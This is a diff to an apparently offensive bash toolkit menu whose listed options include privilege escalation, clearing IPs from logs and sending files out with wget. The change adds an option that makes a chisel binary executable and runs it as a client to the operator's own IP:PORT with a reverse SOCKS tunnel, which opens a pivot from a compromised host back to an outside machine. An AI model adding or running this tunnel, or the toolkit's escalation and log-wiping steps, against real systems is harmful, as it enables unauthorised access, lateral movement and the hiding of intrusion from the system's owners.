@@ -156,7 +156,7 @@ while true; do
 	echo -ne " 102. Decode base64 text to file\t\t\t103. Decode base64 text to bash\t\t\t104. PrivEsc with a binary ELF file using 'ps'\n"
 	echo -ne " 105. PrivEsc with a binary ELF file using 'id'\t\t106. PrivEsc with a binary ELF file and 'cat'\t110. Convert hex to bin\n"
 	echo -ne " 111. Show writable files\t\t\t\t120. unzip a file\t\t\t\t121. Ping sweep\n"
-	echo -ne " 136. Capture All packets from loopback\n"
+	echo -ne " 136. Capture All packets from loopback\t\t\t481. run chisel client\n"
 	echo -ne " 24. PrivEsc with wget to send a file\t\t\t25. PrivEsc with zip\t\t\t\t26. PrivEsc with perl\n"
 	echo -ne " 27. PrivEsc with git\t\t\t\t\t28. PrivEsc with apt\t\t\t\t29. PrivEsc with cat\n"
 	echo -ne " 142. clear IP from logs\t\t\t\t143. SOCAT Port Forward\t\t\t\t144. sudo -l\n"
@@ -2761,6 +2761,20 @@ while true; do
 	;;
 	"480")
 		Scarica "rek7/mXtract" "ENTSSL""rek7/mXtract/archive/refs/heads/master.zip" "mXtract.zip"
+	;;
+	"481")
+		echo "Digit the chisel release version"
+		read -e -p "(example, chisel_1.7.7_linux_amd64): " CHSL
+		if [[ -f $CHSL && "$CHSL" != "" ]];
+		then
+			echo "Digit YOUR machine's IP:PORT"
+			read -p "(example, 10.11.12.13:8080): " MHST
+			if [[ "$MHST" != "" ]];
+			then
+				chmod +x ./$CHSL
+				./$CHSL client "$MHST" R:socks
+			fi
+		fi
 	;;
 	*)
 		echo "error, invalid choice"
